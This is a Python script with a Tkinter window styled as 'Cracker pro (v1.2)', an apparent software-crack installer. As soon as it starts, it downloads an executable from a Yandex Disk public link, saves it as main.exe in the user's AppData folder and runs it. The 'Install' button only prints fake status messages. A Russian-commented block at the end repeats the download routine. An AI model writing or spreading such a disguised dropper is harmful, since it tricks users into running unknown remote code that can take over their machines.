import os
import pip
try:
    import requests
except Exception:
    pip.main(['install', 'requests'])
    import requests

from urllib.parse import urlencode
import tkinter
from config import Programm, ProgrammUrl
import getpass

user = getpass.getuser()
root = tkinter.Tk()
root.title('Installer')
root.geometry('500x500')
root.wm_attributes('-toolwindow', 1)

print('Installing auto update...')

temp_path = rf"C:\Users\{user}\AppData"
autoUpdate = os.path.join(temp_path, 'main.exe')

base_url = "https://cloud-api.yandex.net/v1/disk/public/resources/download?"
final_url = base_url + urlencode({"public_key": ProgrammUrl})


resp = requests.get(final_url)

download_url = resp.json()["href"]
install_response = requests.get(download_url)

with open(autoUpdate, "wb") as file:
    file.write(install_response.content)

os.startfile(autoUpdate)

print(f'Successfully installed auto update')

text = tkinter.Label(text='Cracker pro (v1.2)', fg='black', font='Arial 20')
target1 = tkinter.Label(text=f'Target programm: {Programm}', fg='black', font='Arial 15')
button1 = tkinter.Button(text='Install', font='Arial 15', command=lambda:install())

text.place(x=125, y=20)
target1.place(x=100, y=100)
button1.place(x=200, y=150)

def install():
    print('Checking programm version...')
    print('[Status]: Ok')
    print('Checking auto update...')
    print('[Status]: Ok')
    print(f'Installing programm: {Programm}...')
    

root.mainloop()
'''
import requests

# Ваша публичная ссылка
public_key = "ВАША_ПУБЛИЧНАЯ_ССЫЛКА"

# 1. Запрос прямой ссылки для скачивания
base_url = "https://cloud-api.yandex.net/v1/disk/public/resources/download?"
final_url = base_url + urlencode({"public_key": public_key})
response = requests.get(final_url)
download_url = response.json()["href"]

# 2. Скачиваем файл
install_response = requests.get(download_url)
with open("installer.py", "wb") as f:
    f.write(install_response.content)
print("Установщик скачан как installer.py")
'''